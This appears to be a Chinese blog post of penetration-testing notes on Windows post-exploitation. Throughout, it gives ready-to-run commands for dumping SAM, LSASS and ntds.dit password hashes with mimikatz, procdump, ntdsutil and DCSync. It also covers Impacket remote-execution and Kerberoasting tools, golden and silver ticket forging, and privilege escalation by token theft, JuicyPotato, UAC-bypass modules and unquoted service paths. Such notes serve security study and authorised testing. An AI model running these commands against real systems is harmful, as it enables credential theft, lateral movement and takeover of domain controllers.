---
title: Windows后渗透
published: 2025-07-10
description: '主要记录Windows的hash获取、impacket工具、提权等'
image: ''
tags: [Windows,后渗透]
category: '笔记'
draft: false 
lang: ''
---

# 通过系统SAM表获取密码

SAM文件夹一般位于`C:\Windows\System32\config\SAM\`

主要使用工具：[mimikatz](https://github.com/gentilkiwi/mimikatz)

该工具有两个模式online、offline

## 原理
先读取hklm\system获取syskey再使用syskey解密hklm\sam

## online
online模式其实就是将mimikatz上传到目标系统上`system`身份运行`lsadump::sam`获取目标系统上sam中的密码hash

该模式需要用户**具备SYSTEM权限**或**使用模拟的SYSTEM令牌**

以SYSTEM权限启动exe文件后运行以下命令

```bash
privilege::debug			#获得debug权限
token::elevate				#模拟一个system令牌
lsadump::sam					#dumpSAM数据库
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751080155011-361cc7b1-04b2-4c17-b682-e974a3967cd4.png)

拿到hash后就是破解

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751080269330-c20b4b9e-e237-4412-90d3-e4097f3cdecc.png)

## offline
导出目标系统上的SAM数据库文件

同样需要管理员或`SYSTEM`权限

```bash
reg save hklm\sam {保存路径}sam.hiv
reg save hklm\system {保存路径}system.hiv
```

然后将导出的文件下载到攻击机（本地），以管理员或`SYSTEM`权限运行mimikatz

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751081087321-e264407c-580d-4a5b-b90d-a1c89ac92941.png)

获取hash

```bash
lsadump::sam /sam:E:\sam.hiv /system:E:\system.hiv
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751081547119-a5c30afb-829c-4cb1-987c-01d49a15ddc2.png)

# 通过Lsass的内存获取密码
## 目标系统中运行mimikatz获取明文密码
该方法<font style="color:rgb(102, 102, 102);">从lsass.exe的内存中提权hash</font>

```bash
privilege::debug
log			#启用日志，会在运行目录生成mimikatz.log文件
sekurlsa::logonpasswords			#通过各种方法获取明文密码
```

关于`sekurlsa::logonpasswords`获取密码发方式有：

```bash
sekurlsa::msv	#获取 HASH (LM,NTLM) 
sekurlsa::wdigest #通过可逆的方式去内存中读取明文密码
sekurlsa::Kerberos #假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码
sekurlsa::tspkg #通过tspkg读取明文密码
sekurlsa::livessp #通过livessp 读取明文密码
sekurlsa::ssp #通过ssp 读取明文密码
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751085968120-32a83e0d-0d35-4203-a4d6-c797f1a437d0.png)

## procdump结合mimikatz离线获取明文密码
下载：[https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump)

procdump是微软的工具，一般不会被杀软杀掉，但mimikatz会

将对应版本的procdump上传到目标系统并执行以下命令生成一个dmp文件（需要管理员权限）

```bash
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751087122596-7d6c6254-58d5-498e-8fd1-9f8ecc11e871.png)

下载生成的lsass.dmp文件到本地，使用mimikatz解析

```bash
mimikatz.exe		#启动mimikatz
sekurlsa::minidump E:\lsass.dmp
sekurlsa::logonpasswords
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751087449474-a4cb3d1f-a48a-4ed4-91fe-d6fa070553a6.png)

# 提取域控的ntds.dit并获取密码
ntds.dit文件一般位于：`<font style="color:rgb(51, 51, 51);">C:\Windows\ntds\ntds.dit</font>`

## 获取ntds.dit文件
### 利用vssadmin工具（域管理员权限）
vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。

<font style="color:rgb(51, 51, 51);">其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</font>

<font style="color:rgb(51, 51, 51);">获取ntds.dit文件流程如下</font>

+ <font style="color:rgb(51, 51, 51);">创建C盘的卷影拷贝</font>

```bash
vssadmin create shadow /for=C:
```

+ <font style="color:rgb(51, 51, 51);">将卷影中的ntds.dit文件拷贝出来</font>

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
```

+ <font style="color:rgb(51, 51, 51);">删除卷影</font>

```bash
vssadmin delete shadow /for=C: /quiet
```

### 利用vssown.vbs脚本（域管理员权限）
下载：[https://github.com/borigue/ptscripts/blob/master/windows/vssown.vbs](https://github.com/borigue/ptscripts/blob/master/windows/vssown.vbs)

该脚本本质上是通过wmi对ShadowCopy进行操作，其功能与vssadmin类似，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。

操作流程如下：

+ 启动脚本

```bash
cscript vssown.vbs /start
```

+ 拷贝卷影

```bash
cscript vssown.vbs /create c
```

+ 列出已经拷贝的卷影

```bash
cscript vssown.vbs /list
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751422283309-2e5c1310-88ad-410d-81ff-704e7b71da23.png)

+ 复制文件

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\ntds.dit
```

+ 删除卷影

```bash
cscript vssown.vbs /delete <列出卷影时的ID>
cscript vssown.vbs /delete {D0E1B1B0-96B3-4A5E-988A-4DA2738A078D}
```

### 利用Ntdsutil.exe工具（域管理员权限）
Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。

操作流程如下：

+ 创建快照

```bash
ntdsutil snapshot "activate instance ntds" create quit quit
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424071060-98b10dd2-c0ee-4c21-ba38-eb0a4a82d472.png)

+ 挂载快照

```bash
ntdsutil snapshot "mount <ID>" quit quit
ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424091340-7be50cda-12cb-4f47-b519-79826c5dd2ca.png)

+ 复制文件

```bash
copy C:\$SNAP_202009291002_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424117547-ff50549d-90ef-4613-af55-d0741b282ee0.png)

+ 卸载并删除快照

```bash
ntdsutil snapshot "mount <ID>" "delete <ID>" quit quit

ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" "delete {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424137962-947b414e-aa0a-4b1f-a8cc-ed659eb82832.png)

### Ntdsutil创建IFM（域管理员权限）
<font style="color:rgb(51, 51, 51);">除了利用上面那种操作来获取Ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。</font>**<font style="color:rgb(51, 51, 51);">在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件。</font>**

<font style="color:rgb(51, 51, 51);">IFM利用流程如下：</font>

+ <font style="color:rgb(51, 51, 51);">执行如下命令</font>

```bash
ntdsutil "ac i ntds" "ifm" "create full c:/test" q q 
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424661372-d97fb039-a696-4728-943c-02fc90d5d60a.png)

test文件夹中内容

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751424750098-bdfe2f21-516d-4c1b-b33b-83e5f1f9e717.png)

+ 将ntds.dit复制出来

```bash
copy "C:\test\Active Directory\ntds.dit" C:\ntds.dit
```

+ 最后删除test文件夹即可

### 利用PowerShell下的两个脚本
#### <font style="color:rgb(51, 51, 51);">Nishang中的Copy-VSS.ps1</font>
<font style="color:rgb(51, 51, 51);">Nishang中的Copy-VSS.ps1脚本可以用于自动提取——NTDS.DIT，SAM和SYSTEM这些必要文件。这些文件将被解压到当前工作目录或其他任意的指定文件夹中。</font>

下载：[https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1)

powershell中导入脚本，然后使用powershell运行`copy-vss`命令，运行成功后会将SAM、SYSTEM、NTDS.dit文件复制到当前目录

关于禁用脚本问题，可以使用以下命令允许任意脚本运行

```bash
Set-ExecutionPolicy Unrestricted
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751430098278-49d639bf-6c32-4c1b-b41c-1f3f1a4823a8.png)

指定路径

```bash
Copy-VSS -DestinationDir C:\
```

#### **<font style="color:rgb(51, 51, 51);">PowerSploit中的Invoke-NinjaCopy.ps1</font>**
下载：[https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)

<font style="color:rgb(51, 51, 51);">该脚本用于“万能复制”，像windows主机里SAM文件、域控中的Ntds.dit，里面数据很多有价值的信息，普通的COPY命令是无法复制的，使用万能复制可以复制这类文件。</font>

<font style="color:rgb(51, 51, 51);">使用如下：</font>

```bash
Invoke-NinjaCopy -Path <需要复制的文件> -LocalDestination <复制文件保存位置>
```

powershell运行以下命令

```plain
Import-Module .\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"
```

**<font style="color:rgb(51, 51, 51);">这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。</font>**

## <font style="color:rgb(51, 51, 51);">导出SYSTEM文件</font>
除了使用上面powershell中的脚本导出外还可以使用以下命令

```bash
reg save hklm\system {保存路径}system.hiv
```

## 获取ntds.dit中的hash
### <font style="color:rgba(0, 0, 0, 0.85);">利用E</font>**<font style="color:rgba(0, 0, 0, 0.85);">sedbexport和Ntdsxtract</font>**<font style="color:rgba(0, 0, 0, 0.85);">工具</font>
详细看参考文章

### <font style="color:rgba(0, 0, 0, 0.85);">使用Impacket中的secretsdump（离线）</font>
下载地址：[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

也可以运行`pip`安装impacket包

<font style="color:rgb(51, 51, 51);">secretsdump.py是Impacket工具包中的一个脚本，该脚本实现了多种不需要在远程主机上执行任何代理的情况下转储机密数据的技术。对于SAM和LSA Secrets（包括缓存的凭据），我们尽可能的尝试从注册表中读取，然后将hives保存在目标系统（％SYSTEMROOT％\Temp目录）中，并从那里读取其余的数据。</font>

<font style="color:rgb(51, 51, 51);">secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到Ntds.dit和SYSTEM这两个文件。如果条件满足，你可以执行以下命令：</font>

```bash
python secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457665442-9bef2868-f106-4e51-a284-2ecf14909b66.png)

更多详细见impacket使用总结

### mimikatz（在线）
在目标机器上运行使用管理员运行mimikatz以及以下命令：

```bash
lsadump::dcsync /domain:xxx.com /all /csv
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751459824302-730c46c4-94d3-42ed-8c97-13455644290b.png)



### <font style="color:rgb(51, 51, 51);">Invoke-DCSync（在线）</font>
下载：[https://gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)

<font style="color:rgb(51, 51, 51);">该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</font>

<font style="color:rgb(51, 51, 51);">命令：</font>

```bash
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751460531186-e268503a-d52a-4c9e-b53f-404b434b1aea.png)

### ntds.dit总结
上面的各种利用工具只是一部分，还有很多其它方式，多寻找文章吧

# impacket工具包的使用总结
下载地址：[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

## 安装
### 压缩包安装
下载压缩包并解压

然后进入压缩包目录下的`examples`目录，使用python3运行对应的py文件即可

```bash
python3 wmiexec.py domain/user:password@ip
python3 psexec.py domain/user@ip -hashs :NTLM
```

### PIP安装
```bash
python3 -m pipx install impacket
```

安装完成后家目录下的`.local/bin/`中会有对应的impacket中py文件的软链接

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457878813-0652c969-dd5d-43b1-904f-c1275e14e697.png)

可选：

+ 将该目录临时加入环境变量，这样就可以使用快捷命令

```bash
export PATH="$PATH:/root/.local/bin"
```

+ 持久化加入环境变量，注销后重新登录就会自动执行脚本加入环境变量，也可以运行`**<font style="color:rgb(64, 64, 64);background-color:rgb(236, 236, 236);">source /etc/profile</font>**`命令为当前登录用户运行脚本（推荐）。要卸载的话毫无疑问删除脚本即可

```bash
#在/etc/profile.d/目录下创建一个脚本，脚本内容为以下内容即可
#!/bin/sh
export PATH="$PATH:/root/.local/bin"
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751505533844-54b02862-829b-40ea-8ce3-a6bb629e18d1.png)

使用例子

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751457957975-2922fcaf-5726-4462-bc49-406292239289.png)

## 基础使用
### lookupsid.py
<font style="color:rgb(51, 51, 51);">通过[MS-LSAT] MSRPC接口的Windows SID bruteforcer示例，查找远程用户/组。</font>

```bash
lookupsid.py domain/user:password@ip
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522852911-b4a1dcc9-773f-4d99-b05b-cd8a8e87fd65.png)

### Rpcdump.py
<font style="color:rgb(51, 51, 51);">该脚本将转储在目标上注册的RPC端点和字符串bindings列表。它也会尝试将它们与一些知名的端点进行匹配。</font>

```bash
rpcdump.py domain/user:password@ip
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751523010493-961d7a0e-f072-486e-9f66-9b305d49865d.png)

### Samrdump.py
<font style="color:rgb(51, 51, 51);">与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息</font>

```bash
samrdump.py domain/user:password@ip
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751523027074-ceabdf31-72a4-4cea-9486-84ce964c9e17.png)

### Sniff.py
<font style="color:rgb(51, 51, 51);">一个简单的数据包嗅探脚本。使用pcapy库来侦听通过指定接口传输的数据包。与wireshark类似</font>

```bash
sniff.py
```

### **<font style="color:rgba(0, 0, 0, 0.85);">Sniffer.py</font>**
<font style="color:rgb(51, 51, 51);">一个简单的数据包嗅探脚本，使用原始套接字来侦听与指定协议相对应的传输数据包。一样与wireshark类似</font>

```bash
sniffer.py
```

### **<font style="color:rgba(0, 0, 0, 0.85);">Wmiquery.py</font>**
<font style="color:rgb(51, 51, 51);">它允许发出WQL查询并获取目标系统WMI对象的描述信息。需要学习WQL查询</font>

```bash
wmiquery.py domain/user:password@ip
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522071339-b507267e-ae06-47aa-bf5c-65d196fe44cd.png)

## 进阶使用
通用选项

```bash
-hashs :NTLM
-codec [gbk|utf-8|...]
```

以下exec.py都需要管理员权限

### **<font style="color:rgba(0, 0, 0, 0.85);">Psexec.py</font>**
<font style="color:rgb(51, 51, 51);">Psexec.py允许你在远程Windows系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程shell命令（不需要安装任何客户端软件）。</font>

```bash
#第一种
psexec.py domain/user:password@ip
#第二种
psexec.py domain/user@ip -hashs :NTLM
```

常用选项

```bash
-port [destination port] #指定目标SMB的端口
-codec codec #目标回显的编码，可先执行chcp.com拿到回显编码
-service-name service_name #指定创建服务的名称，默认随机
-remote-binary-name remote_binary_name #指定上传文件的名称，默认随机
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522919968-4cfa4197-5fa7-4e80-ab5e-11390265e637.png)

该功能需要使用的账号具有管理员权限

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522942857-de7616ae-3ee4-4c66-823a-cf3d2c543405.png)

### Wmiexec.py
<font style="color:rgb(51, 51, 51);">它会生成一个使用Windows Management Instrumentation的半交互式shell，并以管理员身份运行。你不需要在目标服务器上安装任何的服务/代理，因此它非常的隐蔽。</font>

<font style="color:rgb(51, 51, 51);">与psexec.py一样需要账号为管理员，否则运行不了</font>

```bash
wmiexec.py domain/user:password@ip
```

常用选项

```bash
-share SHARE #设置连接的共享路径，默认ADMIN$
-nooutput #不获取输出，没有SMB连接
-silentcommand #不运行cmd.exe，直接运行命令
-shell-type {cmd,powershell} #设置返回的Shell类型
-com-version MAJOR_VERSION:MINOR_VERSION #设置DCOM版本
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751513570154-afbbbfd6-f7d4-4e7e-a191-9b7ea0eb388d.png)

### atexec.py
<font style="color:rgb(51, 51, 51);">通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。</font>

```bash
atexec.py domain/user:password@ip systeminfo
```

常用选项

```bash
-session-id #SESSION_ID 使用登录的SESSION运行（无回显，不会主动调用cmd如silentcommand）
-silentcommand #不运行cmd.exe，直接运行命令
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751522317943-61e3ebda-43df-4eaa-b490-5ff6da4c3bab.png)

### smbexec.py
可使用密码认证、hash认证、kerberos认证。

需要注意此脚本有一些参数是硬编码的，最好使用前修改一下。还可以增加单行命令执行的功能。

```bash
smbexec.py domain/user:password@ip
```

常用选项

```bash
-share SHARE #自定义回显的共享路径，默认为C$
-mode {SHARE,SERVER} #设置SHARE回显或者SERVER回显，SERVER回显需要root linux
-shell-type {cmd,powershell} #设置返回的Shell类型
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751528440468-32383f02-f041-4285-bdf4-03c591a06f0c.png)

另外还有一些选项是硬编码的，可以去py文件中修改

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751528570146-9c11d2eb-5c58-450b-a95c-dae92138ba18.png)

### dcomexec.py
一般使用MMC20，而且DCOM有时候会遇到0x800706ba的错误，一般都是被防火墙拦截。

```bash
dcomexec.py -object MMC20 domain/user:password@ip
```

常用选项

```bash
-share SHARE #设置连接的共享路径，默认ADMIN$
-nooutput #不获取输出，没有SMB连接
-object [{ShellWindows,ShellBrowserWindow,MMC20}] #设置RCE利用的类型
-com-version MAJOR_VERSION:MINOR_VERSION #设置DCOM版本
-shell-type {cmd,powershell} #设置返回的Shell类型
-silentcommand #不运行cmd.exe，直接运行命令
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751529158123-342e5d34-2e40-4a93-b81c-28805eafa4de.png)

### getTGT.py
通过认证后去DC请求TGT并保存。

获取administrator用户的TGT，TGT过期前可拿来获取其权限

```bash
getTGT.py domain/user:password -dc-ip DCip
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751531282326-10fe98ed-7b05-47a9-919a-92b819d2789d.png)

### getST.py
通过认证后去DC请求ST并保存。

用administrator的权限获取WIN7.test.com的cifs服务的服务票据（ST）

```bash
getST.py test/administrator:'admin@123456' -dc-ip 192.168.106.155 -spn cifs/WIN7.test.com
```

常用选项

```bash
-impersonate IMPERSONATE    #模拟为指定的用户的权限
-additional-ticket ticket.ccache    #在委派的S4U2Proxy中添加一个可转发的服务票据
-force-forwardable  #通过CVE-2020-17049强制忽略校验票据是否可转发
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751531458857-7e1cd8d6-69af-49a8-ba56-8c03b15d8a7b.png)

### getPac.py
查询test用户的PAC，可以看到登录次数、密码错误次数之类的

```bash
getPac.py test.com/administrator:password -targetUser test
```

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751532834314-b5ada234-05bb-49e6-8825-6835e9df2f3d.png)

注意账号前的格式变成了`test.com`，且不能指定dcip，所以`test.com`会经过dns解析,需要在`/etc/hosts`中指定`test.com`的IP为域控IP。

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751532989472-6799ac59-be19-4a90-99e7-d3ceb547d4bb.png)

### GetUserSPNs.py
查询`test.com`中的用户的SPN有哪些，只需要任意一个域用户即可利用，只要有用户的SPN可以请求，可以获取其TGS爆破其密码

```bash
GetUserSPNs.py test.com/administrator:'admin@123456' -target-domain test.com
```

常用选项

```bash
-request #请求所有用户SPN的TGS，可拿来爆破用户密码
-request-user username #请求指定用户的TGS
-usersfile USERSFILE #请求指定文件内所有用户的TGS
```

### GetNPUsers.py
查询域内哪些用户不需要Kerberos预身份认证，只需要任意一个域用户即可利用，只要有用户不需要Kerberos预身份认证，可以获取其AS_REQ拿来爆破其密码。

```bash
GetNPUsers.py test.com/administrator:'admin@123456'
```

常用选项

```bash
-request #请求不需要Kerberos预身份认证用户的TGT，可拿来爆破
-format {hashcat,john} #设置AS_REQ的爆破格式，默认hashcat
-usersfile USERSFILE #请求指定文件内所有用户的TGT
-outputfile OUTPUTFILE #向指定文件输出结果
```

### rbcd.py
使用条件有点多，等用到了再记录，详细将参考文章的进阶

### ticketConverter.py
不需要认证，因为这个脚本是在ccache和kirbi格式中互相转换用的脚本。

将ccache转换为kirbi，交换位置就是kirbi转换为ccache

```bash
ticketConverter.py .\administrator.ccache .\administrator.kirbi
```

### ticketer.py
这个脚本主要拿来伪造各种服务票据，例如银票据、金票据、钻石票据、蓝宝石票据。

#### 白银票据伪造
银票因为不需要与DC通信，所以比金票更加隐蔽。但是银票只能对伪造的服务有效，且会随着服务账户密码的修改而失效。

##### 信息获取
+ 域SID：域服务器运行`whoami /all`，去除用户SID最后一个`-`及后面的内容
+ 域名：`systeminfo`、`ipconfig /all`
+ 目标服务名

使用win-7$的机器账户的hash`96dd976cc094ca1ddb2f06476fb61eb6`伪造`cifs/win-7`的服务票据，使用票据的用户是根本不存在的qqq或者存在的任意用户。

```bash
ticketer.py -nthash 服务账号hash -domain-sid 域SID -domain 域名 -spn 目标服务 用户名
```

# kerberos认证过程
第一阶段客户端将自己的用户名、IP地址、时间戳发送给AS，AS访问AD是否存在该用户名，存在则返回TGT和与TGS通信的CT_SK

第二阶段客户端将CT_SK、要访问的服务（明文）、TGT发送给TGS，TGS返回ST和与服务端通信的CS_SK

第三阶段客户端将ST和CS_SK发送给服务端，服务端认证通过后完成认证

名称解释：

+ AS：Authentication service（认证服务器）
+ AD：Account Database（用户数据库）
+ TGS：Ticket Granting Service（票据授予服务）
+ TGT：Ticket Granting Ticket（票证授予票证）----黄金票据，可以访问任意服务
+ ST：Server Ticket（服务票据）----白银票据，只能访问指定服务
+ CT_SK：Client-TGS SessionKey（客户端-TGS会话密钥）
+ CS_SK：Client-Server SessionKey（客户端-服务端会话密钥）

![](https://cdn.nlark.com/yuque/0/2025/png/44191974/1751527978286-79dcad55-7bea-40d6-a07c-b69d1f25a20c.png)



# 四种票据伪造
## 黄金票据
### meterpreter伪造
制作票据

```bash
golden_ticket_create -d <域名> -u <任意用户名> -s <Domain SID> -k <krbtgt NTLMHash> -t <ticket本地存储路径如:/tmp/krbtgt.ticket>
```

加载票据

```bash
kerberos_ticket_use [票据路径]
```

## 白银票据
## 钻石票据
## 蓝宝石票据
# 提权
## at命令
**在Windows2000、Windows 2003、Windows XP 这三类系统中**，我们可以使用at命令将权限提升至 system权限。 

AT命令是Windows XP中内置的命令，它也可以媲美Windows中的"计划任务"，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。 

因为at命令默认是以system权限下运行的所以我们可以利用以下命令，进行提权。  

```bash
at 时间 /interactive cmd  其中里面的/interactive参数是开启交互模式
at 9:23 /interactive cmd
```

## sc命令
**适用于windows 7/8、03/08、12/16**

因为at命令在win7，win8等更高版本的系统上都已经取消掉了，所以在一些更高版本的windows操作系 统上我们可以用sc命令进行提权。 

SC命令是XP系统中功能强大的DOS命令,SC命令能与"服务控制器"和已安装设备进行通讯。SC是用于与服 务控制管理器和服务进行通信的命令行程序。 

通俗理解就是SC可以启动一个服务，命令如下。

```bash
sc Create systemcmd binPath= "cmd /K start" type= own type= interact   
```

+ systemcmd是服务名称，大家可以随意填写 
+ binpath是启动的命令 
+ type=own是指服务这个服务属于谁 
+ cmd /k start 这个命令就是启动一个新的cmd窗口

## psexec提权
适用版本：Win2003 & Win2008 

微软官方工具包： [https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools](https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools)

提权命令：

```bash
psexec.exe -accepteula -s -i cmd.exe
```

## UAC绕过
使用msf中的模块，详细见[https://www.yuque.com/menghui-qxpxr/ngkw8r/ssdksg7wxq04x0ii#IFe6c](https://www.yuque.com/menghui-qxpxr/ngkw8r/ssdksg7wxq04x0ii#IFe6c)

模块有：

+ exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限
+ exploit/windows/local/bypassuac 
+ exploit/windows/local/bypassuac_injection 
+ exploit/windows/local/bypassuac_fodhelper 
+ exploit/windows/local/bypassuac_eventvwr 
+ exploit/windows/local/bypassuac_comhijack

## 令牌窃取
**适用于2008之前版本**

描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。一般用户双击运行一个进程都会拷贝explorer.exe的Access Token。访问令牌分为：

+ 授权令牌：交互式会话登录（例：本地用户登录、用户桌面登录）
+ 模拟令牌：非交互式登录（例：net use 访问共享文件）

两种token只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。

同样也可以这样理解，当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。

默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。

```bash
meterpreter > use incognito # 先load
meterpreter > list_tokens -u
meterpreter > impersonate_token WEB-SERVER\\Administrator #注意：这里是两个反斜杠\\ 
```

## 烂土豆
所谓的烂土豆提权就是俗称的MS16-075，其是一个本地提权，是针对本地用户的，不能用于域用户。可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM”。

RottenPotato（烂土豆）提权原理如下：

+ 欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。
+ 对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。
+ 模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。

具体使用参考：[https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075)

条件

```bash
whoami /priv    查看特殊权限
如果开启SeImpersonate权限：-t t
如果开启SeAssignPrimaryToken权限：-t u
如果均开启：-t *
如果均未开启：无法提权
```

命令

```bash
JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

+ p：执行的文件
+ l：开启一个端口
+ c：CLSID--class SID，具体参考[CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

也可以写一个`bat|vbs`脚本，用`-p`指定执行这个脚本来反弹shell、导出数据库、执行命令等等操作

## 可信任服务路径漏洞
**如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的**

检测漏洞

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | 
findstr /i /v "C:\Windows\\" | findstr /i /v """
```

注册一个服务

```bash
 sc create everythin binPath ="C:\Program Files\everything\everything.exe"
```

然后将shell重命名为`Program`并放在c盘根目录下，启动服务后由于空格的原因，会执行c盘下的`Program`文件

注意这里有一个问题，shell文件虽然会被执行，但最终会提示服务启动失败，然后结束进程，所以如果是要msf和cs的shell需要在拿到shell后立即迁移进程，msf可以在payload的监听前设置脚本`set AutoRunScript migrate -f`，可用`show advanced`查看，这样拿到shell会自动进行进程迁移，cs得安装插件，具体怎么做自行搜索。



# 参考文章
[SAM、内存获取密码](https://xz.aliyun.com/news/8194)

[ntds.dit利用](https://www.freebuf.com/articles/network/251267.html)

[impacket使用-1（进阶）](https://xz.aliyun.com/news/11323)

[impacket使用-2（基础）](https://www.freebuf.com/sectool/175208.html)

[黄金、白银票据制作与利用](https://www.freebuf.com/articles/others-articles/329728.html)

[钻石、蓝宝石票据制作与利用](https://www.cnblogs.com/mt0u/p/17627758.html)

[四种票据制作与利用](https://xz.aliyun.com/news/13032)

[四种票据的原理、利用及防御](https://www.freebuf.com/articles/system/437641.html)

